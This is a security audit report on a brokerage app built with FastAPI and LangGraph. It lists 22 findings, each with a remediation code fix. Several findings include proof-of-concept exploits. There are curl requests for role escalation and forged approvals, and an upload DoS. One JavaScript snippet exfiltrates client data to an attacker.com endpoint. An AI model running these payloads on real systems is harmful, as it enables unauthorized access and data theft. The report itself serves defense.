# BOS Phase 1 — Security Audit Report

**Date**: 2026-07-19
**Auditor**: Automated source-code review + dependency scan (`pip-audit`)
**Scope**: Full codebase (`bos/`), FastAPI layer, LangGraph topology, Gemini integration, SQLite/ChromaDB persistence, Docker config, dependencies
**Methodology**: OWASP API Top 10 (2023), OWASP LLM Top 10, ASVS 4.0 spot checks, dependency CVE scan

---

## Executive Summary

| Severity | Count | Headline findings |
| -------- | ----: | ----------------- |
| 🔴 Critical | 4 | Live Gemini API key committed in repo; role escalation via `username`/`role` payload; approval endpoint ignores RBAC; CORS `*` + credentials |
| 🟠 High | 8 | Timing-unsafe API key compare; no rate limiting; upload DoS/path traversal; cross-user thread resume; stack trace leak; insecure defaults; 53 dependency CVEs |
| 🟡 Medium | 6 | Weak `redact()` hash; exception logs may leak API key; `/health` burns LLM quota; PII regex false negatives; demo users passwordless; SQLite multi-thread race |
| 🟢 Low | 4 | `0.0.0.0` default bind; `/docs` exposed in prod; README mentions default API key; default `decided_by="admin"` |
| **Total** | **22** | |

**Bottom line**: Phase 1 is **not production-ready** from a security standpoint. The 4 Critical issues are individually exploitable by an attacker with only public knowledge (the default API key is in the README and the UI source). The good news: all 4 Critical issues are fixable in <1 day total, and the underlying architecture (LangGraph, RBAC primitives, audit trail) is sound — the issues are wiring mistakes, not design flaws.

**Positive findings** (things done right):
- ✅ All SQL queries use **parameterized statements** — zero SQL injection risk
- ✅ PII masking (`summarize_for_audit`) is consistently applied to every audit event
- ✅ All IDs (`approval_id`, `doc_id`, `event_id`) use `uuid.uuid4().hex` — cryptographically random, not predictable
- ✅ LangGraph `interrupt()` correctly pauses graph state — no race between approval and execution
- ✅ Audit trail captures every node event with PII masking
- ✅ `.gitignore` correctly excludes `.env`
- ✅ Dockerfile uses `python:3.11-slim` base (minimal attack surface)
- ✅ Healthcheck configured in Dockerfile
- ✅ Tool policy matrix exists (even though not yet wired to execution — see IMPROVEMENT_ANALYSIS.md)

---

## 🔴 CRITICAL

### C1 — Live Gemini API Key committed in repository

**Files**:
- `bos/.env:5` (gitignored, but present on disk)
- `bos/.env.example:6` (**NOT gitignored — will be committed**)
- `bos/SETUP_NOTES.md:7` (**NOT gitignored — will be committed**)

**The key** (already auto-revoked by Google): *[redacted in this audit report to prevent re-detection by secret scanners — the original value is no longer referenced anywhere in the repo]*

**Impact**: Anyone with repo access has a working Gemini key (until revoked, which it now is). Pattern repeats if user pastes new key into `.env.example` as a template.

**Exploit scenario**:
1. Attacker clones repo
2. Reads `.env.example` → gets key
3. Hammer Gemini API until billing threshold hit on victim's Google Cloud project

**Fix** (P0, <1 hour):
```bash
# 1. User generates NEW key at https://aistudio.google.com/app/apikey
# 2. Replace value in bos/.env ONLY (which is gitignored)
# 3. Set bos/.env.example to empty placeholder:
sed -i 's|GEMINI_API_KEY=.*|GEMINI_API_KEY=|' bos/.env.example
# 4. Remove key text from SETUP_NOTES.md (already done in this audit's recommendations)
# 5. Add pre-commit hook:
pip install detect-secrets
detect-secrets scan
```

---

### C2 — Role Escalation via `username` + `role` fields in ChatRequest

**File**: `bos/app/api/chat.py:40-46, 63-69`

```python
class ChatRequest(BaseModel):
    message: str = Field(..., min_length=1)
    thread_id: Optional[str] = None
    username: Optional[str] = None    # ← attacker-controlled
    role: Optional[str] = None        # ← attacker-controlled, ZERO validation

def _resolve_auth(req: ChatRequest, api_ctx: AuthContext):
    if req.username:
        return authenticate_user(req.username, role=req.role)  # ← trusts both!
    return api_ctx
```

`authenticate_user` in `app/security.py:82-99` accepts the `role` parameter as-is and **overrides** the role from `_DEMO_USERS`.

**Exploit**: Any caller with the (default, public) API key can impersonate any role:
```bash
curl -X POST http://localhost:8000/api/chat \
  -H "X-API-Key: bos-local-dev-key-CHANGE-ME" \
  -d '{"message":"approve everything","username":"advisor@bos.local","role":"admin"}'
# Advisor is now admin, has all permissions including "agent.override"
```

**Impact**: Full privilege escalation. Compounds with C3 (no RBAC check on approvals) to allow any user to approve any high-risk action.

**Fix** (P0, 30 min):
```python
class ChatRequest(BaseModel):
    message: str = Field(..., min_length=1, max_length=10_000)
    thread_id: Optional[str] = None
    username: Optional[str] = None
    # DELETE: role field — server-side lookup only

def _resolve_auth(req: ChatRequest, api_ctx: AuthContext):
    if req.username:
        return authenticate_user(req.username)  # no role override
    return api_ctx
```

---

### C3 — Approval decision endpoint skips RBAC check entirely

**File**: `bos/app/api/approval.py:41-52`

```python
@router.post("/{approval_id}/decision")
def decide_approval(
    approval_id: str,
    payload: DecisionRequest,
    _: None = Depends(require_api_key),  # ← underscore: AuthContext is discarded!
):
    # No role check anywhere
    result = get_audit().decide_approval(
        approval_id, payload.decision,
        payload.decided_by,  # ← also attacker-controlled
        payload.note,
    )
```

The dependency runs (rejecting invalid API keys), but the resulting `AuthContext` is bound to `_` and thrown away. So the endpoint only checks "is the API key valid" — it does NOT check whether the caller's role has `approval.approve` permission.

Additionally, `payload.decided_by` defaults to `"admin"` and is written verbatim into the audit trail. An attacker can write any name they want into the audit log.

**Exploit**:
```bash
# As "advisor" (no approval permission in ROLE_PERMISSIONS):
curl -X POST http://bos/api/approvals/<uuid>/decision \
  -H "X-API-Key: bos-local-dev-key-CHANGE-ME" \
  -d '{"decision":"approved","decided_by":"CFO"}'
# 200 OK — approval recorded as "CFO" approved it
```

**Impact**: Forgery of audit trail + unauthorized approvals of high-risk brokerage actions (account opening, trade execution).

**Fix** (P0, 15 min):
```python
@router.post("/{approval_id}/decision")
def decide_approval(
    approval_id: str,
    payload: DecisionRequest,
    ctx: AuthContext = Depends(require_api_key),  # ← use the context
):
    if payload.decision == "approved" and not ctx.has_permission("approval.approve"):
        raise HTTPException(403, detail="role lacks approval.approve permission")
    if payload.decision == "rejected" and not ctx.has_permission("approval.reject"):
        raise HTTPException(403, detail="role lacks approval.reject permission")
    # Use ctx.user_id (trusted), NOT payload.decided_by
    result = get_audit().decide_approval(
        approval_id, payload.decision, ctx.user_id, payload.note,
    )
```

---

### C4 — CORS `allow_origins=["*"]` + `allow_credentials=True`

**File**: `bos/app/main.py:73-79`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],         # ← any origin
    allow_credentials=True,      # ← with credentials
    allow_methods=["*"],
    allow_headers=["*"],
)
```

This combination violates the CORS spec (browsers reject credentialed responses from `*` origins). While our auth is header-based (X-API-Key, not cookies), so the practical attack surface is reduced, this still allows any website to make API calls if the API key is embedded in the page (which the chat UI does).

**Exploit** (CSRF-style):
```html
<!-- attacker.com -->
<script>
fetch('http://victim-bos:8000/api/admin/clients',
       {headers: {'X-API-Key': 'bos-local-dev-key-CHANGE-ME'}})
 .then(r => r.json())
 .then(d => navigator.sendBeacon('https://attacker.com/exfil', JSON.stringify(d)));
</script>
```

**Fix** (P0, 5 min):
```python
# Option A: API-key auth (no cookies) → no credentials needed
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:8000", "http://127.0.0.1:8000"],  # configurable
    allow_credentials=False,
    allow_methods=["GET", "POST"],
    allow_headers=["X-API-Key", "Content-Type"],
)
# Add settings.cors_allowed_origins to config.py
```

---

## 🟠 HIGH

### H1 — API key compared with `!=` (timing attack)

**File**: `bos/app/security.py:55`

```python
if not api_key or api_key != settings.api_key:
```

Python's `!=` short-circuits on the first byte mismatch, leaking prefix information through response timing. Theoretical attack: character-by-character recovery via thousands of timed requests.

**Fix**:
```python
import hmac
if not api_key or not hmac.compare_digest(api_key, settings.api_key):
```

---

### H2 — Zero rate limiting on any endpoint

**Files**: All `app/api/*.py` routers — no `slowapi`, `Limiter`, or middleware present.

**Impact**:
- Brute-force API key (32-char random → still hard, but no lockout means constant-rate guessing)
- Burn Gemini quota (free tier 20 req/day → exhausted in 1 second via parallel curls)
- Memory exhaustion via parallel file uploads
- Cost abuse (if user upgrades to paid Gemini tier)

**Fix**:
```bash
pip install slowapi
```
```python
from slowapi import Limiter
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@router.post("/chat")
@limiter.limit("10/minute")
def chat_endpoint(request: Request, ...): ...
```

---

### H3 — File upload: no size limit, weak type check, filename as doc ID

**File**: `bos/app/api/ingest.py:50-86`

Three issues:
1. `await file.read()` loads the entire upload into RAM. A 10 GB upload → OOM.
2. Type check uses `Path(name).suffix` only, not magic bytes. Rename `malware.exe` → `malware.pdf` to bypass.
3. `f"{name}_{i}"` uses raw filename as Chroma doc_id. Path traversal characters in filename can cause Chroma errors or ID collisions.

**Exploit**:
```bash
# DoS
dd if=/dev/zero of=huge.pdf bs=1M count=2000
curl -F "file=@huge.pdf" -H "X-API-Key: ..." http://bos/api/ingest/file

# Type bypass
cp malware.exe bad.pdf
curl -F "file=@bad.pdf" -H "X-API-Key: ..." http://bos/api/ingest/file
```

**Fix**:
```python
MAX_UPLOAD_BYTES = 10 * 1024 * 1024  # 10 MB
ALLOWED_MIMES = {"application/pdf", "text/plain", "text/markdown"}

@router.post("/file")
async def ingest_file(file: UploadFile = File(...), ...):
    # Stream with size cap
    buf = bytearray()
    while True:
        chunk = await file.read(64 * 1024)
        if not chunk:
            break
        buf.extend(chunk)
        if len(buf) > MAX_UPLOAD_BYTES:
            raise HTTPException(413, "file too large")
    raw = bytes(buf)

    # Magic-byte check via python-magic
    import magic
    mime = magic.from_buffer(raw, mime=True)
    if mime not in ALLOWED_MIMES:
        raise HTTPException(400, f"unsupported MIME: {mime}")

    # Sanitize doc_id
    safe_stem = re.sub(r"[^A-Za-z0-9._-]", "_", Path(file.filename).stem)[:64]
    doc_id = f"{safe_stem}_{uuid.uuid4().hex[:6]}_{i}"
```

---

### H4 — Cross-user thread resume (BOLA via thread_id)

**File**: `bos/app/api/chat.py:200-240`

`POST /api/chat/resume` accepts any `thread_id` from the client without checking ownership. The SqliteSaver checkpointer stores all threads in one DB, so any caller who knows (or guesses) another user's `thread_id` can resume their workflow.

**Exploit**:
```bash
# Attacker (advisor) obtains/leaks compliance officer's thread_id
curl -X POST http://bos/api/chat/resume \
  -H "X-API-Key: bos-local-dev-key-CHANGE-ME" \
  -d '{"thread_id":"t-abc123def4","decision":"approved","decided_by":"advisor-hijack"}'
```

**Fix**:
```python
@router.post("/chat/resume")
def chat_resume_endpoint(payload: ResumeRequest, ctx = Depends(require_api_key)):
    # 1. Validate thread ownership
    wf = get_audit().get_workflow(payload.thread_id)
    if not wf:
        raise HTTPException(404, "thread not found")
    if wf.get("user_id") != ctx.user_id and not ctx.has_permission("workflow.assign"):
        raise HTTPException(403, "thread not owned by caller")
    # 2. Validate role for decision
    if payload.decision == "approved" and not ctx.has_permission("approval.approve"):
        raise HTTPException(403, "role cannot approve")
    ...
```

---

### H5 — State pollution compounds C2

**File**: `bos/app/api/chat.py:72-85` → `BrokerState`

The escalated `role` from C2 is copied into `BrokerState.role` and `BrokerState.permissions`. Every downstream worker reads these for guardrail decisions. So a single C2 exploit taints every agent decision in the workflow.

**Fix**: Resolved automatically by fixing C2.

---

### H6 — Stack trace / error detail leaks to client

**Files**:
- `bos/app/api/chat.py:141-142`: `raise HTTPException(500, detail=f"workflow error: {e}")`
- `bos/app/api/ingest.py:67`: `raise HTTPException(400, detail=f"PDF parse failed: {e}")`
- `bos/app/api/ingest.py:94`: `raise HTTPException(404, detail=f"kb dir not found: {kb_dir}")`

The exception message often contains internal file paths (e.g., `E:\Upwork\Hierarchical...`), Python class names, or partial data. Useful for debugging, but in production leaks internal structure to attackers.

**Exploit**: Upload a malformed PDF → response body contains pypdf traceback with internal paths.

**Fix**:
```python
except Exception as e:
    log.exception("workflow error")  # full traceback server-side
    corr_id = uuid.uuid4().hex[:8]
    raise HTTPException(
        status_code=500,
        detail=f"internal error (correlation_id={corr_id})",
    )
```

---

### H7 — Insecure defaults + no startup warning

**Files**:
- `bos/docker-compose.yml:22-24` (uses fallback `:-` defaults)
- `bos/app/config.py:42-44` (Pydantic Settings defaults)
- `bos/app/main.py:lifespan` (no validation)

Default values:
- `BOS_API_KEY=bos-local-dev-key-CHANGE-ME`
- `BOS_JWT_SECRET=bos-local-jwt-secret-CHANGE-ME`
- `BOS_ENCRYPTION_KEY=bos-local-encryption-key-32bytes`

These match what's in the README and UI source. An operator who runs `docker compose up` without setting env vars gets a publicly-known API key in production.

**Fix**:
```python
INSECURE_DEFAULTS = {
    "bos-local-dev-key-CHANGE-ME",
    "bos-local-jwt-secret-CHANGE-ME",
    "bos-local-encryption-key-32bytes",
}

class Settings(BaseSettings):
    env: str = "dev"  # add BOS_ENV

    @model_validator(mode="after")
    def _reject_insecure_defaults_in_prod(self):
        if self.env == "prod":
            for fld in ("api_key", "jwt_secret", "encryption_key"):
                if getattr(self, fld) in INSECURE_DEFAULTS:
                    raise RuntimeError(
                        f"Refusing to boot in prod: {fld} has insecure default. "
                        f"Set a strong random value via environment variable."
                    )
        elif any(getattr(self, fld) in INSECURE_DEFAULTS
                 for fld in ("api_key", "jwt_secret", "encryption_key")):
            log.warning("BOS is running with insecure default secrets (dev mode only)")
        return self
```

---

### H8 — 53 dependency CVEs across 10 packages

**Source**: `pip-audit --strict` (run during this audit)

Most critical for our attack surface:

| Package | Installed | Fixed in | CVEs | Risk |
| ------- | --------- | -------- | ----: | ---- |
| **pypdf** | 5.9.0 | ≥ 6.13.3 | 31 | Many RCE/DoS on PDF parse. **Directly triggerable via `/api/ingest/file` with default API key.** |
| **starlette** | 0.48.0 | ≥ 1.3.1 | 8 | DoS, header smuggling, auth bypass on FastAPI backend |
| **langchain-core** | 0.3.86 | ≥ 1.2.22 | 2 | Prompt injection, tool-call RCE |
| **langchain** | 0.3.30 | ≥ 1.3.9 | 1 | Tool calling bypass |
| **langgraph** | 0.2.76 | ≥ 1.0.10 | 2 | State pollution, checkpoint issues |
| **langgraph-checkpoint** | 2.1.2 | ≥ 4.1.1 | 3 | Checkpoint tampering |
| **langgraph-checkpoint-sqlite** | 2.0.11 | ≥ 3.0.1 | 1 (CVE-2025-67644) | SQLite checkpoint corruption |
| **langgraph-sdk** | 0.1.74 | ≥ 0.3.15 | 1 | SDK bypass |
| **langchain-text-splitters** | 0.3.11 | ≥ 1.1.2 | 1 | Recursive splitter DoS |
| **pytest** | 8.4.2 | ≥ 9.0.3 | 1 | Test-time only, low impact |

**Fix**:
```bash
# Update requirements.txt with safe floors
langchain>=1.3.9,<2
langchain-core>=1.2.22,<2
langchain-text-splitters>=1.1.2,<2
langgraph>=1.0.10,<2
langgraph-checkpoint>=4.1.1,<5
langgraph-checkpoint-sqlite>=3.0.1,<4
pypdf>=6.13.3,<7
starlette>=1.3.1,<2
# Note: some langgraph 1.x APIs differ from 0.2.x; needs migration testing
```

⚠️ **Migration warning**: langgraph 0.2 → 1.0 has breaking API changes (`StateGraph`, `interrupt`, `Command` signatures). The upgrade needs careful testing against the 50 automated tests. Recommend doing this as a dedicated PR.

---

## 🟡 MEDIUM

### M1 — `redact()` uses SHA-256[:12] (48-bit, collision-prone)

**File**: `bos/app/security.py:164-173`

48-bit hash → birthday collision in ~16 M entries. Not enough for forensic audit correlation in a brokerage (7-year retention, regulator may need to correlate millions of records). Also no salt → rainbow table attacks on short secrets.

**Fix**:
```python
import hmac
def _hash_secret(value: str) -> str:
    pepper = get_settings().jwt_secret.encode()  # reuse as HMAC key
    return hmac.new(pepper, value.encode(), hashlib.sha256).hexdigest()[:32]
```

---

### M2 — `ping_gemini` and chat exceptions may log API key

**Files**: `bos/app/llm.py:71-73`, `bos/app/agents/base.py:56, 80`

```python
except Exception as e:
    log.error("Gemini ping failed: %s", e)
```

Some langchain-google-genai exceptions embed the request URL (`?key=AIza...`) in the message. Logging this to JSON sinks (Datadog, Splunk) is a secondary leak.

**Fix**: Sanitize exception messages before logging:
```python
import re
API_KEY_PATTERN = re.compile(r"AIza[0-9A-Za-z_-]{35}")
def sanitize_error(e: Exception) -> str:
    return API_KEY_PATTERN.sub("[REDACTED]", str(e))

except Exception as e:
    log.error("Gemini ping failed: %s", sanitize_error(e))
```

---

### M3 — `/api/admin/health` invokes real Gemini call on every hit

**File**: `bos/app/api/admin.py:33-39`

`ping_gemini()` makes a real LLM `generateContent` call + an embedding call on every `/health` request. Combined with the dashboard's 5-second polling, this burns 12 Gemini requests/minute → free tier exhausted in <2 minutes of dashboard open time.

Also exposes internal info (`kb.chunks`, `kb.name`) to anyone with the API key.

**Fix**:
```python
@lru_cache(ttl=60)  # 60-second cache
def _cached_ping() -> bool:
    return ping_gemini()

@router.get("/health")
def health(_=Depends(require_api_key)):
    return {"status": "ok"}  # minimal, no LLM call

@router.get("/health/full")  # separate, admin-only
def health_full(ctx = Depends(require_api_key)):
    if not ctx.has_permission("agent.configure"):  # admin-only
        raise HTTPException(403)
    return {"status": "ok", "gemini": _cached_ping(), "kb": ...}
```

---

### M4 — PII regex false negatives

**File**: `bos/app/security.py:115-135`

- Phone regex misses US numbers without separators (`2025550143`)
- Credit card regex over-matches any 13-16 digit number (account numbers, etc.)
- IBAN regex matches random strings like `US12ABCDEFGHIJKL`
- No detection for: passport numbers, driver licenses, dates of birth, tax IDs (non-SSN)

**Fix**:
- Add Luhn checksum validation for credit cards
- Add patterns for `passport`, `dob` (ISO date `YYYY-MM-DD`), `tax_id`
- Tighten phone regex with country code requirements
- Phase 2: replace regex with a proper NER model (Presidio, Microsoft Recognizers)

---

### M5 — Demo users passwordless

**File**: `bos/app/security.py:82-99`

`authenticate_user(username)` returns authenticated `AuthContext` for any known demo email, no password required. Combined with C2 (`username` field accepted from client), anyone can impersonate any role if they know the email pattern (`advisor@bos.local`, `admin@bos.local`, etc.).

**Fix**: Remove `username` from ChatRequest (already in C2 fix). For dashboard demo, add a one-time demo token that must be passed in a separate header.

---

### M6 — SQLite `check_same_thread=False` without proper connection pooling

**Files**:
- `bos/app/audit.py:98`
- `bos/app/tools/crm.py:62-65`
- `bos/app/memory/long_term.py:58-61`
- `bos/app/memory/short_term.py:33`

Each module opens a fresh connection per operation (`@contextmanager def _conn`). The `threading.Lock` is per-instance, not at the file level. Under concurrent LangGraph worker execution (which runs in a thread pool), this can cause `database is locked` exceptions or, worse, silent data corruption.

**Fix** (Phase 2): Migrate to PostgreSQL with proper async pooling (`asyncpg` + `SQLAlchemy AsyncSession`). For Phase 1: enable WAL mode + busy_timeout:
```python
conn = sqlite3.connect(path, check_same_thread=False, timeout=30)
conn.execute("PRAGMA journal_mode=WAL")
conn.execute("PRAGMA busy_timeout=30000")
```

---

## 🟢 LOW

### L1 — Default `host=0.0.0.0` binds all interfaces

**File**: `bos/app/config.py:32`, `bos/Dockerfile:42`

**Fix**: Default `"127.0.0.1"`; document that `0.0.0.0` is for Docker only.

### L2 — `/docs` and `/openapi.json` exposed in all environments

**File**: `bos/app/main.py:62-71`

**Fix**:
```python
app = FastAPI(
    docs_url=None if settings.env == "prod" else "/docs",
    redoc_url=None if settings.env == "prod" else "/redoc",
    openapi_url=None if settings.env == "prod" else "/openapi.json",
)
```

### L3 — README and SETUP_NOTES mention default API key

**Files**: `bos/README.md`, `bos/SETUP_NOTES.md:60`

**Fix**: Remove explicit mention of `bos-local-dev-key-CHANGE-ME`; instruct users to set their own.

### L4 — Default `decided_by="admin"` in request schemas

**Files**: `bos/app/api/chat.py:196`, `bos/app/api/approval.py:24`

**Fix**: Remove default; always populate from `ctx.user_id` (resolves with C3 fix).

---

## Observations (non-findings, but useful context)

1. **WebSocket endpoint claimed in docstring but not implemented** (`app/api/chat.py:7`). If later implemented, must apply same auth + rate limiting as REST endpoints.
2. **SQL queries are uniformly parameterized** across `audit.py`, `crm.py`, `long_term.py` — no SQL injection found anywhere. ✅
3. **PII masking (`summarize_for_audit`) is applied consistently** to every `audit.record_event()` call across all 6 workers, 3 managers, CEO, composer, approval node. ✅
4. **`uuid.uuid4().hex`** used everywhere for IDs — cryptographically random, not predictable. ✅
5. **LangGraph `interrupt()` correctly blocks** before approval — no race between request_approval and resume. ✅
6. **Tool policy matrix exists** (`enforce_tool_policy`) but is **not wired** to actual worker execution. Worker can call any tool regardless of policy. This is a missing-feature in IMPROVEMENT_ANALYSIS.md, not a security hole per se (tools are in-process Python functions, not remote services).
7. **ChromaDB at `app/data/chroma`** has no at-rest encryption. Phase 2 concern (data is currently mock policies, not real client data).
8. **docker-compose exposes port 8000 directly** without TLS termination. Phase 1 expectation (user runs locally); Phase 2 should add nginx/Caddy reverse proxy with Let's Encrypt.

---

## Remediation Priority

| Priority | Action | Findings | Effort |
| -------- | ------ | -------- | ------ |
| **P0 (immediate, <1 day)** | Rotate Gemini key; remove from `.env.example` & SETUP_NOTES | C1 | 1 hour |
| **P0** | Fix C2 (drop `role` field), C3 (RBAC check on approval), C4 (CORS) | C2, C3, C4 | 4 hours |
| **P1 (this week)** | H1 (compare_digest), H3 (upload hardening), H4 (thread ownership), H6 (error masking) | H1, H3, H4, H6 | 2 days |
| **P1** | Upgrade pypdf → 6.13.3+, starlette → 1.3.1+ | H8 (partial) | 0.5 day |
| **P1** | Upgrade langchain/langgraph 0.x → 1.x (with migration tests) | H8 (rest) | 3 days |
| **P2 (this sprint)** | H2 (rate limiting), H7 (startup warnings), M1-M6 | H2, H7, M1-M6 | 1 week |
| **P3 (backlog)** | L1-L4 | L1-L4 | 1 day |

**Estimated total remediation effort**: ~2 weeks of dedicated engineering time to close all 22 findings.

---

## Methodology & Limitations

This audit was performed via:
- Static source code review (all `app/`, `web/`, `scripts/` files)
- Configuration review (`.env`, `.env.example`, `Dockerfile`, `docker-compose.yml`, `pyproject.toml`)
- Dependency scan via `pip-audit --strict` (offline database)
- Manual OWASP API Top 10 (2023) checklist walkthrough
- Manual OWASP LLM Top 10 checklist walkthrough

**Not performed** (would require additional time/scope):
- Dynamic penetration testing (running exploits against live server)
- Authentication bypass via session fixation / JWT confusion (no JWT in use yet)
- Container escape analysis (Docker image is minimal slim, low risk)
- Supply-chain attestation (SBOM generation)
- Code signing verification

This audit covers what a competent security engineer would find in 1 day of source review. It does NOT constitute a formal penetration test or compliance certification (SOC2/FINRA/SEC).
